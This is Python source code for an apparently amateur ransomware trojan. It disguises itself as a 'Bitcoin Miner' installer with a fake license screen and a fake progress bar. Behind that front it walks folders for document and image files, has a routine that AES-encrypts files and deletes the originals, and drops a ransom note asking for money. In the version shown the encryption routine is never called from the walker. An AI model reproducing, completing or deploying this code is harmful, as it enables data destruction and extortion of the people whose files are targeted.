import os, time
from Crypto.Cipher import AES
from Crypto import Random
import tkinter as tk
from tkinter import ttk
import threading





def encryptFile(in_filename, out_filename=None, chunksize=64*1024):
    if not out_filename:
        out_filename = in_filename + '.enc'
    
    key = Random.get_random_bytes(32)
    iv = Random.get_random_bytes(16)
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    #filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            #outfile.write(struct.pack('<Q', filesize))
            outfile.write(key)
            outfile.write(iv)
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - len(chunk) % 16)

                outfile.write(encryptor.encrypt(chunk))
            os.remove(in_filename)


def traverseDirectory(startPlace=None):
    #os.path.abspath(os.sep) the root directory for any os
    if not startPlace:
    #startPlace = os.path.abspath(os.sep)
        startPlace ='.'
    #only include the document type file to encrypt, no need for movie and music
    extension = ('jpg','txt','doc','png','ppt','pdf','docx','psd','ai','tif','dmg','7z')
# traverse root directory, and list directories as dirs and files as files
    for root, dirs, files in os.walk(startPlace):
        for file in files:
            if file.lower().endswith(extension):
                print(file)
    createMessage()

def decryptFile(in_filename, out_filename=None, chunksize=64*1024):
    if not out_filename:
        out_filename = os.path.splitext(in_filename)[0]
    with open(in_filename, 'rb') as infile:
        with open("./result/"+out_filename, 'wb') as outfile:
            key = infile.read(32)
            iv = infile.read(16)
            decryptor = AES.new(key, AES.MODE_CBC, iv)
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))


def createMessage():
    with open ('Help.txt', 'w') as file:
        message = 'Your important files have been encrypted, Please send me some money.'
        file.write(message)
        file.close()




def cancel():
    app.destroy()

LARGE_FONT= ("Verdana", 12)


class TrojanApp(tk.Tk):
    
    def __init__(self, *args, **kwargs):
        
        tk.Tk.__init__(self, *args, **kwargs)
        
        #tk.Tk.iconbitmap(self,default='clienticon.ico')
        tk.Tk.wm_title(self, "Bitcoin Miner")
        
        container = tk.Frame(self)
        container.pack(side="top", fill="both", expand = True)
        container.grid_rowconfigure(0, weight=1)
        container.grid_columnconfigure(0, weight=1)
        
        self.frames = {}
        
        for F in (StartPage, PageOne):
            
            frame = F(container, self)
            self.frames[F] = frame
            frame.grid(row=0, column=0, sticky="nsew")
        
        self.show_frame(StartPage)
    
    def show_frame(self, cont):
        
        frame = self.frames[cont]
        frame.tkraise()


class StartPage(tk.Frame):
    def __init__(self, parent, controller):
        tk.Frame.__init__(self,parent)
        
        label = tk.Label(self, text="Agreement License", font=LARGE_FONT)
        label.pack(pady=10,padx=10)
        
        txt = tk.Text(self, borderwidth=3, relief="sunken")
        txt.insert("1.0","     THE SOFTWARE IS PROVIDED 'AS IS', WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE X CONSORTIUM BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n")
        txt.insert("2.0", "  Note:To keep your computer secure, you should only run programs or install software from a trusted source. If you're not sure about this software’s source, click Cancel to stop the program and the installation.After installation, do not move or rename the application or the installation directory of the application. Otherwise, you will not be able to run update installers.")
        txt.config(font=("consolas", 12), undo=True, wrap='word', state="disabled" )
        txt.grid(row=0, column=0, sticky="ew", padx=2, pady=2)
        txt.pack()
        
        # create a Scrollbar and associate it with txt
#        scrollb = tk.Scrollbar(self, command=self.txt.yview)
#        scrollb.grid(row=0, column=1, sticky='nsew')
#        self.txt['yscrollcommand'] = scrollb.set

        
        button = ttk.Button(self, text="Continue",
                            command=lambda: controller.show_frame(PageOne))
        button.pack()
                            
        button2 = ttk.Button(self, text="Cancel",
                            command=cancel)
        button2.pack()


class PageOne(tk.Frame):
    
    def __init__(self, parent, controller):
        tk.Frame.__init__(self, parent)
        label = ttk.Label(self, text="Checking System Configuration...\nPlease be patient", font=LARGE_FONT)
        label.pack(pady=10,padx=10)
        
        self.progress = ttk.Progressbar(self, orient="horizontal",
                                        length=200, mode="determinate")
        self.progress.pack()
        
        self.bytes = 0
        self.maxbytes = 0
        self.start()

    def start(self):
        self.progress["value"] = 0
        self.maxbytes = 50000
        self.progress["maximum"] = 50000
        self.read_bytes()
    
    def read_bytes(self):
        '''simulate reading 500 bytes; update progress bar'''
        self.bytes += 50
        self.progress["value"] = self.bytes
        if self.bytes < self.maxbytes:
            # read more bytes after 100 ms
            self.after(200, self.read_bytes)


if __name__ == "__main__":
    t=threading.Thread(target = traverseDirectory)
    t.daemon = True
    t.start()
    app = TrojanApp()
    app.geometry('500x500')
    app.mainloop()






#encryptFile(sys.argv[1])
#decryptFile(sys.argv[1])

